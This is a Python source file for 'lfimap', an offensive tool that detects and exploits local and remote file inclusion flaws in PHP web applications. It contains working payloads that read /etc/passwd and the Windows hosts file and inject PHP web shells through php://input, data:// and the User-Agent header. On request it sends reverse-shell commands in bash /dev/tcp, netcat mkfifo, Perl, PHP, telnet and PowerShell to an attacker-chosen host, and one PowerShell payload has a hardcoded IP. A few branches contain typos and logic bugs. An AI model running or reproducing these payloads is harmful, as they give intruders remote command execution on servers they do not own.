#!/usr/bin/env python3

import os
import sys
import re
import socket
import subprocess
import time
import random
import argparse
import requests
import requests.exceptions
import threading
import http.client
import http.server
import socketserver
import traceback

from argparse import RawTextHelpFormatter

exploits = []
proxies = {}

class ServerHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

def serve_forever():
    socketserver.TCPServer.allow_reuse_address = True
    
    with socketserver.TCPServer(("", 8801), ServerHandler) as httpd:

        if(args.verbose):
            print("[i] Opening local web server and setting up 'rfitest.txt' that will be used as test inclusion")

        tempf = open("rfitest.txt", "w")
        tempf.write("961bb08a95dbc34397248d92352da799")
        tempf.close()
        
        try:
            httpd.serve_forever()
        except:
            httpd.server_close()
            raise

def prepareHeaders():
    user_agents = [
                ":Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
                ":Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
                ":Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
                ":Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
                ":Mozilla/3.01 (Macintosh; PPC)",
                ":Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",
                ":Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",
                ":Opera/8.00 (Windows NT 5.1; U; en)",
                ":Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
                  ]                                                                                                                                                                             
    headers = {}                                                                                                                                                                                
    if(args.agent):
        headers['User-Agent'] = ":" + agent                                                                                                                                                     
    else:                                                                                                                                                                    
        headers['User-Agent'] = random.choice(user_agents)                                                                                                                                      
    if(args.referer):
        headers['Referer'] = ':' + referer
    
    headers['Accept-Language'] = ':en-US;'
    headers['Accept-Encoding'] = ':gzip, deflate'
    headers['Accept'] = ':text/html,application/xhtml+xml,application/xml;'
    headers['Connection'] = ':Close'
    return headers


def addHeader(newKey, newVal):
    headers[newKey] = newVal


def getExploit(req, request_type, exploit_type, getVal, postVal, headers, attackType, os):
    global exploits
    e = {}
    e['REQUEST_TYPE'] = request_type
    e['EXPLOIT_TYPE'] = exploit_type
    e['GETVAL'] = getVal
    e['POSTVAL'] = postVal
    e['HEADERS'] = req.headers
    e['ATTACK_METHOD'] = attackType
    e['OS'] = os
    exploits.append(e)
    return e

def test_file_wrapper(url):
    if(args.verbose):
        print("Testing with file:// wrapper")
    
    testL = []
    testL.append("file:///etc/passwd")
    testL.append("file://%2Fetc%2Fpasswd")

    for i in range(len(testL)):
        u = url.replace(args.param, testL[i])
        res = requests.get(u, headers = headers, proxies = proxies)
        if(checkPayload(res)):
            print("[+] LFI -> " + u)
            
            if(args.no_stop):
                continue
            else: break

def test_trunc(url):
    if(args.verbose):
        print("Testing path truncation using '" + wordlist + "' wordlist ...")

    f = open(wordlist, "r")
    
    for line in f:
        line = line[:-1]
        if(args.param in url):
            u = url.replace(args.param, line)

        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        except Exception as e:
            print("Unknown problem occurred: " + e)

        if(checkPayload(res)):
            if('/etc/passwd' in u):
                tempUrl = u.replace('/etc/passwd', args.param)
                os = 'LINUX'
            else:
                tempUrl = u.replace('Windows/System32/drivers/etc/hosts', args.param)
                os = 'WINDOWS'

            getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'TRUNC', os)
            print("[+] LFI -> " + u)

            if(args.revshell):
                exploit(exploits, 'TRUNC')
            
            if(not args.no_stop):
                f.close()
                break
            else: continue
    
    if(args.verbose): print("Testing /proc/self/environ inclusion via User-Agent")
    test_self_environ(url)

def test_self_environ(url):
    testL = []
    testL.append("/proc/self/environ&cmd=cat%20/etc/passwd")
    testL.append("/proc/self/environ%00&cmd=cat%20/etc/passwd")
    
    tempHeaders = headers
    tempHeaders['User-Agent'] = "Mozilla<?=`$_GET[cmd]`?>/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
    
    for i in range(len(testL)):
        u = url.replace(args.param, testL[i])
        res = requests.get(u, headers = tempHeaders, proxies = proxies)
        if(checkPayload(res)):
            print("[+] RCE -> " + u + " via User-Agent String: '" + tempHeaders['User-Agent'] + "'")
            
            if(args.no_stop):
                continue
            else: break

def test_php_filter(url):
    if(args.verbose):
        print("Testing PHP filter wrapper ...")

    testL = []
    testL.append("php://filter/resource=/etc/passwd")
    testL.append("php://filter/convert.base64-encode/resource=/etc/passwd")
    testL.append("php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd")
    testL.append("php://filter/read=string.rot13/resource=/etc/passwd")
    
    testW = []
    testW.append("php://filter/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/convert.iconv.utf-8.utf-16/resource=C:/Windows/System32/drivers/etc/hosts")
    testW.append("php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts")
    
    #Linux
    for i in range(len(testL)):
        if(args.param in url):
            u = url.replace(args.param, testL[i])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
            
            if(checkPayload(res)):
                tempUrl = u.replace('/etc/passwd', 'CMD')
                getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
                print("[+] LFI -> " + u)
                
                if(args.no_stop):
                    continue
                else: break
        except ConnectionError:
            print("Connection error has occurred...")

        except Exception as e:
            print("Unknown problem occurred : ")

            
        
    #Windows
    for i in range(len(testW)):
        u = url.replace(args.param, testW[i])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
            if(checkPayload(res)):
                tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'CMD')
                getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
                print("[+] LFI -> " + u)
                
                if(args.no_stop):
                    continue
                else: break
        except Exception as e:
            print("Unknown problem occurred: ")


def test_php_data(url):
    if(args.verbose):
        print("Testing PHP data wrapper ...")

    testL = []
    testL.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd")

    testW = []
    testW.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig")
    
    #Linux
    for i in range(len(testL)):
        if(args.param in url):
            u = url.replace(args.param, testL[i])
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        
            if(checkPayload(res)):
                tempUrl = u.replace('cat%20/etc/passwd', 'CMD')
                getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'LINUX')
                print("[+] RCE -> " + u)
                if(args.no_stop):
                    continue
                else: break
        
        except Exception as e:
            print("Unknown problem occurred: ")


    #Windows
    for i in range(len(testW)):
        if(args.param in url):
            u = url.replace(args.param, testW[i])
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        
            if(checkPayload(res)):
                tempUrl = u.replace('ipconfig', 'CMD')
                getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'WINDOWS')
                print("[+] RCE -> " + u)
                if(args.no_stop):
                    continue
                else: break
        
        except Exception as e:
            print("Unknown problem occurred: ")

    if(args.revshell):
        exploit(exploits, 'DATA')


def test_php_input(url):
    if(args.verbose):
        print("Testing PHP input wrapper ...")

    testL = []
    testL.append("php://input&cmd=cat%20/etc/passwd")
    
    testW = []
    testW.append("php://input&cmd=ipconfig")
    
    posts = []
    posts.append("<?php echo shell_exec($_GET['cmd']) ?>")
    posts.append("<? system('cat /etc/passwd');echo exec($_GET['cmd']);?>")
    
    #Linux
    for i in range(len(testL)):
        if(args.param in url):
            u = url.replace(args.param, testL[i])
        
        os = ""
        
        for j in range(len(posts)):
            try:
                res = requests.post(u, headers = headers, data=posts[j], proxies = proxies)
                
                if(checkPayload(res)):
                    print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
                    os = 'LINUX'
                    tempUrl = u.replace('cat%20/etc/passwd', 'CMD')
                    getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', os)
                    break
            
            except Exception as e:
                print("Unknown problem occurred: ")
            

    if(os != 'LINUX'):
        #Windows
        for k in range(len(testW)):
            if(args.param in url):
                u = url.replace(args.param, testW[k])
        
            for l in range(len(posts)):
                try:
                    res = requests.post(u, headers = headers, data = posts[l], proxies = proxies)
                    
                    if(checkPayload(res)):
                        tempUrl = u.replace('ipconfig', 'CMD')
                        getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'WINDOWS')
                        print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
                        break
                
                except Exception as e: 
                    print("Unknown problem occurred: ")

    if(args.revshell):
        exploit(exploits, 'INPUT')


def test_php_expect(url):
    if(args.verbose):
            print("Testing PHP expect wrapper ...")

    testL = []
    testL.append("expect://cat%20%2Fetc%2Fpasswd")
    
    testW = []
    testW.append("expect://ipconfig")

    #Linux
    for i in range(len(testL)):
        if(args.param in url):
            u = url.replace(args.param, testL[i])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
        
            if(checkPayload(res)):
                tempUrl = u.replace('cat%20%2Fetc%2Fpasswd', 'CMD')
                getExploit(res, 'GET', 'RCE', tempUrl, testL[i], headers, 'EXPECT', 'LINUX')
                print("[+] RCE -> " + u)
                break
        
        except Exception as e:
            print("Unknown problem occured: ")


    #Windows
    for j in range(len(testW)):
        if(args.param in url):
            u = url.replace(args.param, testW[j])
        
        try:
            res = requests.get(u, headers = headers, proxies = proxies)
            
            if(checkPayload(res)):
                tempUrl = u.replace('ipconfig', 'CMD')
                getExploit(res, 'GET', 'RCE', tempUrl, testW[j], headers, 'EXPECT', 'WINDOWS')
                print("[+] RCE -> " + u)
                break
        
        except Exception as e:
            print("Unknown problem ocurred: ")
        

    if(args.revshell):
        exploit(exploits, 'EXPECT')

def test_rfi(url):
    if(args.verbose):
        print("Testing for RFI ...")
    
    #Localhost RFI test
    if(args.lhost):
        try:
            threading.Thread(target=serve_forever).start()
            
            u = url.replace(args.param, "http://{0}:8801/rfitest.txt".format(args.lhost))
            res = requests.get(u, headers = headers, proxies = proxies)

            if(checkPayload(res)):
                getExploit(res, 'GET', 'RFI', u, '', headers, 'RFI', '')
                print("[+] RFI -> "+ u)
        except:
            pass
    else:
        if(args.verbose):
            print("[i] Testing RFI using internet source. If you want to test RFI on local web server specify '-r' and '--lhost' parameters")

    #Internet RFI test
    if(args.param in url):
        pyld = "https%3a//www.google.com/"
        u = url.replace(args.param, pyld)
    try:
        res = requests.get(u, headers = headers, proxies = proxies, timeout = 2)
        if(checkPayload(res)):
            tempUrl = u.replace(pyld, 'CMD')
            getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
            print("[+] RFI -> " + u)

    except:
        pass

    if(args.revshell):
        exploit(exploits, 'RFI')

#Checks if sent payload is executed, key word check in response
def checkPayload(webResponse):
    KEY_WORDS = ["root:x:0:0", "www-data:",
                "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0",
                "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0",
                "; for 16-bit app support", "sample HOSTS file used by Microsoft",
                "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
                ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
                "c2FtcGxlIEhPU1RT", "=1943785348b45", "www-data:x",
                "window.google=", "961bb08a95dbc34397248d92352da799"]

    for i in range(len(KEY_WORDS)):
        if KEY_WORDS[i] in webResponse.text:
            return True
    return False


#Todo Future enumeration:
#awk -F: '/\/home/ && ($3 >= 1000) {printf "%s:%s\n",$1,$3}' /etc/passwd
#query = "awk -F: '/\/home/ && ($3 >= 1000) || ($3 == 0) {printf "%s\n",$1}' /etc/passwd"
#echo -n "OS: "; uname -o; echo -n "Kernel: ";uname -srm; echo "\nENV VARIABLES:";printenv

def printInfo(ip, port, shellType, attackMethod):
    print("[i] Sending reverse shell to {0}:{1} using {2} via {3}...".format(ip, port, shellType, attackMethod))

def exploit(exploits, method):
    for i in range(len(exploits)):
        exploit = exploits[i]
        
        ip = args.lhost
        port = args.lport
        
        phpPayload = "php+-r+'$sock%3dfsockopen(\"{0}\",{1})%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'".format(ip, str(port))
        perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname"\
                      "(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen"\
                      "(STDERR,\">%26S\")%3bexec(\"/bin/sh+-i\")%3b}%3b'"
        
        bashPayload = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
        ncPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f"
        telnetPayload = "rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|telnet+{0}+{1}+>/tmp/f".format(ip, port)
        
        powershellPayload = "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('192.168.80.129',99)%3b$stream+%3d+$client."\
                            "GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data"\
                            "+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$"\
                            "sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream"\
                            ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\""

        if(exploit['ATTACK_METHOD'] == method and method == 'INPUT'):
            
            #LINUX
            if(exploit['OS'] == 'LINUX'):
                url = exploit['GETVAL']
                
                #Bash
                u = url.replace('CMD', 'which%20bash')
                res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                if('/bin' in res.text and '/bash' in res.text):
                    u = url.replace('CMD', bashPayload)
                    printInfo(ip, port, 'bash', 'input wrapper')
                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    requests.post(url.replace('CMD', "bash+/tmp/1.sh"), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return
                
                #Netcat
                u = url.replace('CMD', 'which%20nc')
                res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                if('/bin' in res.text and '/nc' in res.text):
                    u = url.replace('CMD', ncPayload)
                    printInfo(ip, port, 'nc', 'input wrapper')
                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return

                #PHP
                u = url.replace('CMD', 'which%20php')
                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                if('/bin' in res.text and '/php' in res.text):
                    printInfo(ip, port, 'PHP', 'input wrapper')
                    requests.post(url.replace('CMD', phpPayload), headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return

                #Perl
                u = url.replace('CMD', 'which%20perl')
                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                if('/bin' in res.text and '/perl' in res.text):
                    u = url.replace('CMD', perlPayload)
                    printInfo(ip, port, 'perl', 'input wrapper')
                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return
                
                #Telnet
                u = url.replace('CMD', 'which%20telnet')
                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                if('/bin' in res.text and '/telnet' in res.text):
                    u = url.replace('CMD', telnetPayload)
                    printInfo(ip, port, 'telnet', 'input wrapper')
                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return
            

            
            #WINDOWS
            elif(exploit['OS'] == 'WINDOWS'):
                
                url = exploit['GETVAL']
               
                #Powershell
                u = url.replace('CMD', 'powershell.exe%20ipconfig')
                res = requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                if('Windows IP Configuration' in res.text):
                    u = url.replace('CMD', powershellPayload) 
                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    printInfo(ip, port, 'powershell', 'input wrapper')
                    return
                
                #Netcat
                u = url.replace('CMD', 'powershell.exe+if(Test-Path+%25windir%25\System32\\nc.exe){Write-Output+"lfimap-nc.exe"}%3b')
                res = requests.post(u, headers = headers, data=exploit['POSTVAL'], proxies = proxies)
                if('lfimap-nc.exe' in res.text):
                    u = url.replace('CMD', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                    printInfo(ip, port, 'nc', 'input wrapper')
                    requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
                    return
                


        elif(exploit['ATTACK_METHOD'] == method and method == 'DATA'):
            #Linux
            if(exploit['OS'] == 'LINUX'):
                url = exploit['GETVAL']
               
                #Bash
                u = url.replace('CMD', 'which%20bash')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/bash' in res.text):
                    printInfo(ip, port, 'bash', 'data wrapper')
                    u = url.replace('CMD', bashPayload)
                    requests.get(u, headers = headers, proxies = proxies)
                    requests.get(url.replace('CMD', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
                    return

                #Netcat
                u = url.replace('CMD', 'which%20nc')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/nc' in res.text):
                    printInfo(ip, port, 'nc', 'data wrapper')
                    u = url.replace('CMD', ncPayload)
                    requests.get(u, headers = headers, proxies = proxies)
                    return
                
                #PHP
                u = url.replace('CMD', 'which%20php')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/php' in res.text):
                    printInfo(ip, port, 'PHP', 'data wrapper')
                    requests.get(url.replace('CMD', phpPayload), headers = headers, proxies = proxies)
                    return

                #Perl
                u = url.replace('CMD', 'which%20perl')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/perl' in res.text):
                    printInfo(ip, port, 'perl', 'data wrapper')
                    requests.get(url.replace('CMD', perlPayload), headers = headers, proxies = proxies)
                    return

                
                #Telnet
                u = url.replace('CMD', 'which%20telnet')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/telnet' in res.text):
                    u = url.replace('CMD', telnetPayload)
                    printInfo(ip, port, 'telnet', 'data wrapper')
                    requests.get(u, headers = headers, proxies = proxies)
                    return

            #Windows
            else:
                url = exploit['GETVAL']

                #Powershell
                u = url.replace('CMD', 'powershell.exe%20ipconfig')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('Windows IP Configuration' in res.text):
                    printInfo(ip, port, 'powershell', 'data wrapper')
                    u = url.replace('CMD', powershellPayload)
                    requests.get(u, headers = headers, proxies = proxies)
                    return

                #Netcat
                u = url.replace('CMD', "dir%20C:\Windows\System32")
                res = requests.get(u, headers = headers, proxies = proxies)
                if('nc.exe' in res.text):
                    u = url.replace('CMD', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                    printInfo(ip, port, 'nc', 'data wrapper')
                    requests.get(u, headers = headers, proxies = proxies)
                    return
                

        elif(exploit['ATTACK_METHOD'] == method and method == 'EXPECT'):
            #Linux
            if(exploit['OS' == 'LINUX']):
                url = exploit['GETVAL']
                
                #Bash
                u = url.replace('CMD', 'which%20bash')
                res = requsts.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/bash' in res.text):
                    u = url.replace('CMD', bashPayload)
                    printInfo(ip, port, 'bash', 'expect wrapper')
                    requests.get(u, headers = headers, proxies = proxies)
                    requests.get(url.replace('CMD', "bash+/tmp/1.sh"), headers = headers, proxies = proxies)
                    return

                #Netcat
                u = url.replace('CMD', 'which%20nc')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/nc' in res.text):
                    u = url.replace('CMD', ncPayload)
                    printInfo(ip, port, 'nc', 'expect wrapper')
                    requests.get(u, headers = headers, proxies = proxies)
                    return
               
                #PHP
                u = url.replace('CMD', 'which%20php')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/php' in res.text):
                    printInfo(ip, port, 'PHP', 'expect wrapper')
                    requests.get(url.replace('CMD', phpPayload), headers = headers, proxies = proxies)
                    return

                #Perl
                u = url.replace('CMD', 'which%20perl')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/perl' in res.text):
                    printInfo(ip, port, 'perl', 'expect wrapper')
                    requests.get(url.replace('CMD', perlPayload), headers = headers, proxies = proxies)
                    return

                
                #Telnet
                u = url.replace('CMD', 'which%20telnet')
                res = requests.get(u, headers = headers, proxies = proxies)
                if('/bin' in res.text and '/telnet' in res.text):
                    u = url.replace('CMD', telnetPayload)
                    printInfo(ip, port, 'telnet', 'expect wrapper')
                    requests.get(u, headers = headers, proxies = proxies)
                    return

            #Windows
            else:
                url = exploit['GETVAL']
                
                #Powershell
                u = url.replace('CMD', 'powershell.exe%20ipconfig')
                if('Windows IP Configuration' in res.text):
                    u = url.replace('CMD', powershellPayload)
                    printInfo(ip, port, 'powershell', 'expect wrapper')
                    requests.get(u, headers = headers, proxies = proxies)
                    return
                
                #Netcat
                u = url.replace('CMD', "dir%20C:\Windows\System32")
                res = request.get(u, headers = headers, proxies = proxies)
                if('nc.exe' in res.text):
                    u = url.replace('CMD', "nc+-e+cmd.exe+{0}+{1}".format(ip, port))
                    printInfo(ip, port, 'nc', 'expect wrapper')
                    request.get(u, headers = headers, proxies = proxies)
                    return


        elif(exploit['ATTACK_METHOD'] == method and method == 'TRUNC'):
            #LINUX
            if(exploit['OS'] == 'LINUX'):
                url = exploit['GETVAL']
                
                #Exploit /proc/self/environ injection via User-Agent string
                #Bash rev. shell
                #TODO

        elif(exploit['ATTACK_METHOD'] == method and method == 'RFI'):
            #url = exploit['GETVAL']
            #u = url.replace('TMP', 'http://' + ip + ":" + port + "/")
            #res = requests.get(u, headers = headers, proxies = proxies)
            pass
     
def lfimap_cleanup():
    if(os.path.exists("rfitest.txt")):
        os.remove("rfitest.txt")

    os._exit(0)

def main():
    global exploits
    global proxies
    
    if(args.proxyAddr):
        proxies['http'] = 'http://'+args.proxyAddr
        proxies['https'] = 'https://'+args.proxyAddr

    #Perform all tests
    if(args.test_all):
        test_file_wrapper(url)
        test_php_filter(url)
        test_php_input(url)
        test_php_data(url)
        test_php_expect(url)
        test_rfi(url)
        test_trunc(url)
        
        print("Done.")
        lfimap_cleanup()

    default = True
    if(args.trunc):
        default = False
        test_trunc(url)
    if(args.php_filter):
        default = False
        test_php_filter(url)
    if(args.php_input):
        default = False
        test_php_input(url)
    if(args.php_data):
        default = False
        test_php_data(url)
    if(args.php_expect):
        default = False
        test_php_expect(url)
    if(args.rfi):
        default = False
        test_rfi(url)

    #Default behaviour
    if(default):
        test_file_wrapper(url)
        test_php_filter(url)
        test_php_input(url)
        test_php_data(url)
        test_php_expect(url)
        test_rfi(url)
    print("Done.")

    lfimap_cleanup()

if(__name__ == "__main__"):
    
    print("")
    parser = argparse.ArgumentParser(description="lfimap, Local File Inclusion discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)
    
    mandatoryGroup = parser.add_argument_group('MANDATORY')
    mandatoryGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=PWN" """)
    
    optionsGroup = parser.add_argument_group('GENERAL')
    optionsGroup.add_argument('-c', type=str, metavar="<cookie>", dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
    optionsGroup.add_argument('-p', type=str, metavar = "<proxy>", dest="proxyAddr", help="\t\t Specify Proxy IP address. Ex: '10.10.10.10:8080'")
    optionsGroup.add_argument('-w', type=str, metavar="<wordlist>", dest='wordlist', help="\t\t Specify wordlist for truncation attack (default 'short.txt')")
    optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest="agent", help="\t\t Specify HTTP user agent")
    optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help="\t\t Specify HTTP referer")
    optionsGroup.add_argument('--param', type=str, metavar="<name>", dest="param", help="\t\t Specify parameter name (default 'PWN')")
    optionsGroup.add_argument('--no-stop', action="store_true", dest = "no_stop", help="\t\t Don't stop using same method upon findings")

    attackGroup = parser.add_argument_group('ATTACK TECHNIQUE')
    attackGroup.add_argument('-f', '--php-filter', action="store_true", dest = 'php_filter', help="\t\t Attack using php filter wrapper")
    attackGroup.add_argument('-i', '--php-input', action="store_true", dest = 'php_input', help="\t\t Attack using php input wrapper")
    attackGroup.add_argument('-d', '--php-data', action="store_true", dest = 'php_data', help="\t\t Attack using php data wrapper")
    attackGroup.add_argument('-e', '--php-expect', action="store_true", dest = 'php_expect', help="\t\t Attack using php expect wrapper")
    attackGroup.add_argument('-t', '--path-trunc', action="store_true", dest="trunc", help="\t\t Path truncation attack")
    attackGroup.add_argument('-r', '--rfi', action = "store_true", dest='rfi', help="\t\t Attack using remote file inclusion")
    attackGroup.add_argument('-a', '--attack-all', action="store_true", dest = 'test_all', help="\t\t Use all available methods to attack")

    payloadGroup = parser.add_argument_group('PAYLOAD')
    payloadGroup.add_argument('-x', '--send-revshell',action="store_true", dest="revshell", help="\t\t Send reverse shell connection if possible (Setup reverse handler first)")
    payloadGroup.add_argument('--lhost', type=str, metavar="<lhost>", dest="lhost", help="\t\t Specify localhost IP address for reverse connection")
    payloadGroup.add_argument('--lport', type=int, metavar="<lport>", dest="lport", help="\t\t Specify local PORT number for reverse connection")

    otherGroup = parser.add_argument_group('OTHER')
    otherGroup.add_argument('-v', '--verbose', action="store_true", dest="verbose", help="\t\t Print more detailed output when performing attacks\n")
    otherGroup.add_argument('-h', '--help', action="help", default=argparse.SUPPRESS, help="\t\t Print this help message\n\n")
    args = parser.parse_args()

    url = args.url
    wordlist = args.wordlist
    agent = args.agent
    referer = args.referer
    
    if(args.test_all):
        if(os.getuid() != 0):
            print("[-] Please run lfimap as admin/root for all tests. Exiting...")
            sys.exit()
    elif(args.lhost):
        if(os.getuid() != 0):
            print("[-] Cannot run LHOST file inclusion test as non admin user. Please run lfimap as admin/root. Exiting...")
            sys.exit()

    urlRegex = re.compile(

    #Checks if provided URL is valid
    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
    r'localhost|' #localhost...
    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
    r'(?::\d+)?' # optional port
    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    if(re.match(urlRegex, url) is None):
        print("URL not valid, exiting...")
        sys.exit(-1)
    elif(not args.param):
        args.param = "PWN"

    #Checks if provided wordlist exists
    if(wordlist is not None):
        if(not os.path.isfile(wordlist)):
            print("[-] Specified wordlist doesn't exist. Exiting...")
            sys.exit(-1)
    else:
        wordlist = "wordlists/short.txt"
        if(not os.path.exists(wordlist) and args.test_all):
            print("[-] Cannot find 'short.txt' list. Since '-a' was specified, lfimap will exit...")
            sys.exit(-1)
    
    #Checks if '--lhost' and '--lport' are provided with '-x'

    if(args.revshell):
        if(not args.lhost):
            print("[-] Please, specify localhost IP ('--lhost') for reverse shell. Exiting...")
            sys.exit(-1)

        if(not args.lport):
            print("[-] Please, specify localhost PORT number ('--lport') for reverse shell. Exiting...")
            sys.exit(-1)

        else:
            reg = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
            if(not re.match(reg, args.lhost)):
                print("[-] LHOST IP address is not valid. Exiting...")
                sys.exit(-1)

            if(args.lport < 1 or args.lport > 65534):
                print("[-] LPORT must be between 1 and 65534. Exiting ...")
                sys.exit(-1)

    #Checks if any parameter is selected for testing
    if(args.param not in url):
        print("[-] '" + args.param + "' is not found in the URL. Please specify it as a parameter value for testing. Exiting...\n")
        sys.exit(-1)
    
    #Warning if cookie is not provided
    if(not args.cookie):
        print("[!] WARNING: Cookie argument ('-c') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
        time.sleep(2)

    

    #Everything is OK, preparing http request headers
    headers = prepareHeaders()
    if(args.cookie is not None):
        addHeader('Cookie', args.cookie)
        
    main()
